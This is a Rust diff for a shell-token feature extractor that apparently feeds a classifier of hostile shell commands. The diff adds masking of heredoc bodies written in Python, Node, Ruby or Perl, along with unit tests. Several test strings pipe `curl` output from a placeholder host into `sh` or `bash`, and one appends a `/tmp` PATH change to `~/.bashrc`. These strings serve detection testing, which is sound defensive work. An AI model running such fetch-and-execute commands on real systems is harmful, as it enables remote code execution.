@@ -20,6 +20,8 @@
 //! is all the downstream TF-IDF vectorizer consumes. The text is never parsed,
 //! expanded or run.
 
+use std::borrow::Cow;
+
 /// Operators kept verbatim by [`normalise`] (the Python `OPERATORS` set).
 fn is_operator(token: &str) -> bool {
     matches!(
@@ -324,11 +326,249 @@ fn head(token: &str) -> &str {
     token.rsplit('/').next().unwrap_or(token)
 }
 
+// ---- Heredoc bodies that are code, not shell ----
+//
+// `python - <<'PY' … PY` feeds Python, and `cat <<'EOF' > fix.py` writes Python;
+// neither body is shell. Tokenised as shell, list syntax such as
+// `['ssh','-o',…]` becomes `[`, `,` and `CMD=[` tokens that only attacks carried
+// in training. Such a body is replaced by one `heredoc_body` line for this
+// block (the char_wb block still sees the raw text). Port of `mask_heredocs` in
+// `shell_tokens.py`; the regex lookaheads there are spelled out by hand here.
+
+const HEREDOC_MASK: &str = "heredoc_body";
+
+/// Characters that end a word for the heredoc checks: `[\s;&|()<>'"]`.
+fn is_heredoc_word_end(c: char) -> bool {
+    is_shell_whitespace(c) || matches!(c, ';' | '&' | '|' | '(' | ')' | '<' | '>' | '\'' | '"')
+}
+
+/// The lookahead `(?=[\s;&|()<>]|$)`: end of line or a separator (not a quote).
+fn is_heredoc_boundary(line: &str, at: usize) -> bool {
+    line[at..].chars().next().is_none_or(|c| {
+        is_shell_whitespace(c) || matches!(c, ';' | '&' | '|' | '(' | ')' | '<' | '>')
+    })
+}
+
+/// Start and end of every word that begins the line or follows `[\s;&|(]`.
+fn heredoc_words(line: &str) -> impl Iterator<Item = (usize, usize)> + '_ {
+    line.char_indices().filter_map(move |(start, c)| {
+        let follows_separator = line[..start]
+            .chars()
+            .next_back()
+            .is_none_or(|prev| is_shell_whitespace(prev) || matches!(prev, ';' | '&' | '|' | '('));
+        if !follows_separator || is_heredoc_word_end(c) {
+            return None;
+        }
+        let end = line[start..]
+            .char_indices()
+            .find(|&(_, c)| is_heredoc_word_end(c))
+            .map_or(line.len(), |(offset, _)| start + offset);
+        Some((start, end))
+    })
+}
+
+/// `python[0-9.]*`, `node`, `ruby` or `perl`, after an optional `…/` path.
+fn is_heredoc_interpreter(word: &str) -> bool {
+    let name = word.rsplit('/').next().unwrap_or(word);
+    matches!(name, "node" | "ruby" | "perl")
+        || name
+            .strip_prefix("python")
+            .is_some_and(|rest| rest.bytes().all(|b| b.is_ascii_digit() || b == b'.'))
+}
+
+/// End of the first word matching `(?:^|[\s;&|(])(?:[^\s;&|()<>'"]*/)?(?:python[0-9.]*|node|ruby|perl)(?=…)`.
+fn heredoc_interpreter_end(line: &str) -> Option<usize> {
+    heredoc_words(line)
+        .find(|&(start, end)| {
+            is_heredoc_boundary(line, end) && is_heredoc_interpreter(&line[start..end])
+        })
+        .map(|(_, end)| end)
+}
+
+/// The first `(?:^|[\s;&|(])(?:cat|tee)(?=…)`: (match start, word end). The
+/// match starts at the separator before the word, or at 0 for the line start.
+fn heredoc_writer(line: &str) -> Option<(usize, usize)> {
+    heredoc_words(line)
+        .find(|&(start, end)| {
+            matches!(&line[start..end], "cat" | "tee") && is_heredoc_boundary(line, end)
+        })
+        .map(|(start, end)| {
+            let separator = line[..start]
+                .char_indices()
+                .next_back()
+                .map_or(0, |(i, _)| i);
+            (separator, end)
+        })
+}
+
+const HEREDOC_FILE_EXTENSIONS: [&str; 20] = [
+    "py", "pyi", "js", "mjs", "cjs", "ts", "tsx", "jsx", "rb", "pl", "pm", "php", "r", "jl",
+    "json", "yml", "yaml", "toml", "ini", "cfg",
+];
+
+/// `\s*['"]?[^\s;&|()<>'"]+\.(?:ext…)['"]?(?=…)` at `at`, case-insensitive.
+fn heredoc_file_target_at(line: &str, at: usize) -> bool {
+    let rest = &line[at..];
+    let mut pos = at + (rest.len() - rest.trim_start_matches(is_shell_whitespace).len());
+    if matches!(line.as_bytes().get(pos), Some(b'\'' | b'"')) {
+        pos += 1;
+    }
+    let end = line[pos..]
+        .char_indices()
+        .find(|&(_, c)| is_heredoc_word_end(c))
+        .map_or(line.len(), |(offset, _)| pos + offset);
+    let path = &line[pos..end];
+    let Some(dot) = path.rfind('.') else {
+        return false;
+    };
+    let extension = path[dot + 1..].to_ascii_lowercase();
+    if dot == 0 || !HEREDOC_FILE_EXTENSIONS.contains(&extension.as_str()) {
+        return false;
+    }
+    if is_heredoc_boundary(line, end) {
+        return true;
+    }
+    matches!(line.as_bytes().get(end), Some(b'\'' | b'"')) && is_heredoc_boundary(line, end + 1)
+}
+
+/// Whether `(?:>>?|\btee(?:\s+-a)?)` followed by a code or data file name
+/// matches anywhere from `from` (Python `HEREDOC_FILE.search(line, start)`).
+fn heredoc_writes_code_file(line: &str, from: usize) -> bool {
+    let bytes = line.as_bytes();
+    for (k, c) in line[from..].char_indices().map(|(i, c)| (from + i, c)) {
+        if c == '>' {
+            if bytes.get(k + 1) == Some(&b'>') && heredoc_file_target_at(line, k + 2) {
+                return true;
+            }
+            if heredoc_file_target_at(line, k + 1) {
+                return true;
+            }
+        }
+        let word_before = line[..k]
+            .chars()
+            .next_back()
+            .is_some_and(|prev| prev.is_alphanumeric() || prev == '_');
+        if !word_before
+            && line[k..]
+                .get(..3)
+                .is_some_and(|w| w.eq_ignore_ascii_case("tee"))
+        {
+            let after = k + 3;
+            let rest = &line[after..];
+            let spaces = rest.len() - rest.trim_start_matches(is_shell_whitespace).len();
+            if spaces > 0
+                && rest[spaces..].starts_with("-a")
+                && heredoc_file_target_at(line, after + spaces + 2)
+            {
+                return true;
+            }
+            if heredoc_file_target_at(line, after) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// `<<-?[ \t]*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1` at `k`: (end, delimiter).
+fn heredoc_op_at(line: &str, k: usize) -> Option<(usize, &str)> {
+    let bytes = line.as_bytes();
+    if !line[k..].starts_with("<<") {
+        return None;
+    }
+    let mut pos = k + 2;
+    if bytes.get(pos) == Some(&b'-') {
+        pos += 1;
+    }
+    while matches!(bytes.get(pos), Some(b' ' | b'\t')) {
+        pos += 1;
+    }
+    let quote = match bytes.get(pos) {
+        Some(&q @ (b'\'' | b'"')) => {
+            pos += 1;
+            Some(q)
+        }
+        _ => None,
+    };
+    let start = pos;
+    if !bytes
+        .get(pos)
+        .is_some_and(|b| b.is_ascii_alphabetic() || *b == b'_')
+    {
+        return None;
+    }
+    while bytes
+        .get(pos)
+        .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_')
+    {
+        pos += 1;
+    }
+    let delimiter = &line[start..pos];
+    match quote {
+        Some(q) if bytes.get(pos) == Some(&q) => Some((pos + 1, delimiter)),
+        Some(_) => None,
+        None => Some((pos, delimiter)),
+    }
+}
+
+/// Delimiter of the first `<<` heredoc that feeds a non-shell interpreter, or
+/// that cat/tee write to a code or data file, on `line`.
+fn heredoc_delimiter(line: &str) -> Option<&str> {
+    let from = match heredoc_interpreter_end(line) {
+        Some(end) => end,
+        None => {
+            let (start, end) = heredoc_writer(line)?;
+            if !heredoc_writes_code_file(line, start) {
+                return None;
+            }
+            end
+        }
+    };
+    let mut k = from;
+    while k < line.len() {
+        if let Some((end, delimiter)) = heredoc_op_at(line, k) {
+            if !line[..k].ends_with('<') {
+                return Some(delimiter);
+            }
+            k = end;
+            continue;
+        }
+        k += line[k..].chars().next().map_or(1, char::len_utf8);
+    }
+    None
+}
+
+/// Replace heredoc bodies that are code (see above) by one `heredoc_body` line.
+/// Matches `shell_tokens.mask_heredocs`.
+pub fn mask_heredocs(text: &str) -> Cow<'_, str> {
+    if !text.contains("<<") {
+        return Cow::Borrowed(text);
+    }
+    let mut out: Vec<&str> = Vec::new();
+    let mut delimiter: Option<&str> = None;
+    for line in text.split('\n') {
+        if let Some(open) = delimiter {
+            if line.trim_matches([' ', '\t', '\r']) == open {
+                out.push(line);
+                delimiter = None;
+            }
+            continue;
+        }
+        out.push(line);
+        delimiter = heredoc_delimiter(line);
+        if delimiter.is_some() {
+            out.push(HEREDOC_MASK);
+        }
+    }
+    Cow::Owned(out.join("\n"))
+}
+
 /// The deterministic shell-token features of `text`, as a multiset in the same
 /// shape the Python `shell_tokens.features` produces (unigrams, adjacent
 /// bigrams, the `CMD=`, `PIPE->` and `REDIR->` structural markers, then the
-/// `DL->` relation markers).
+/// `DL->` relation markers), after [`mask_heredocs`].
 pub fn features(text: &str) -> Vec<String> {
+    let text: &str = &mask_heredocs(text);
     let norm: Vec<String> = tokenize(text).into_iter().map(normalise).collect();
 
     // Unigrams first, then bigrams and markers, in the reference order.
@@ -1163,5 +1403,66 @@ mod tests {
             features("curl -s https://x.example/a | bash; curl -s https://x.example/b | sh");
         assert_eq!(feats.iter().filter(|f| *f == "DL->PIPE->INTERP").count(), 1);
         assert_eq!(feats.last().map(String::as_str), Some("DL->PIPE->INTERP"));
+    }
+
+    // Heredoc masking mirrors `test_shell_tokens.py`.
+
+    #[test]
+    fn heredoc_bodies_of_non_shell_interpreters_are_masked() {
+        let py = "python3 - <<'PY'\nimport subprocess\nsubprocess.run(['ssh','-o','BatchMode=yes','h','uptime'])\nPY\necho done";
+        assert_eq!(
+            mask_heredocs(py),
+            "python3 - <<'PY'\nheredoc_body\nPY\necho done"
+        );
+        let feats = features(py);
+        assert!(feats.iter().any(|f| f == "heredoc_body"));
+        assert!(!feats.iter().any(|f| f == "CMD=["));
+        assert_eq!(
+            mask_heredocs(".venv/bin/python - <<\"EOF\"\nx = [1, 2]\nEOF"),
+            ".venv/bin/python - <<\"EOF\"\nheredoc_body\nEOF"
+        );
+        assert_eq!(
+            mask_heredocs("node <<-JS\n\tconsole.log(1)\n\tJS"),
+            "node <<-JS\nheredoc_body\n\tJS"
+        );
+        // Unterminated: masked to the end.
+        assert_eq!(
+            mask_heredocs("perl <<EOF\nprint 1;"),
+            "perl <<EOF\nheredoc_body"
+        );
+    }
+
+    #[test]
+    fn heredocs_written_to_code_files_are_masked() {
+        assert_eq!(
+            mask_heredocs("cat <<'EOF' > reproduce.py\nimport os\nprint(os.getcwd())\nEOF"),
+            "cat <<'EOF' > reproduce.py\nheredoc_body\nEOF"
+        );
+        assert_eq!(
+            mask_heredocs("cat > cfg.yaml <<EOF\na: [1, 2]\nEOF"),
+            "cat > cfg.yaml <<EOF\nheredoc_body\nEOF"
+        );
+        assert_eq!(
+            mask_heredocs("tee src/app.ts <<'TS' >/dev/null\nexport const x = 1\nTS"),
+            "tee src/app.ts <<'TS' >/dev/null\nheredoc_body\nTS"
+        );
+    }
+
+    #[test]
+    fn shell_heredocs_and_herestrings_stay_shell() {
+        for text in [
+            "bash <<'EOF'\ncurl -s https://x.example/a | sh\nEOF",
+            "cat <<EOF > run.sh\nset -e\nEOF",
+            "cat <<EOF >> ~/.bashrc\nexport PATH=/tmp:$PATH\nEOF",
+            "cat <<EOF\nhello\nEOF",
+            "python3 <<< 'print(1)'\nls",
+            "pythonic <<EOF\nx\nEOF",
+        ] {
+            assert_eq!(mask_heredocs(text), text, "{text}");
+        }
+        assert_eq!(
+            relations("bash <<'EOF'\ncurl -s https://x.example/a | sh\nEOF"),
+            ["DL->PIPE->INTERP"]
+        );
     }
 }
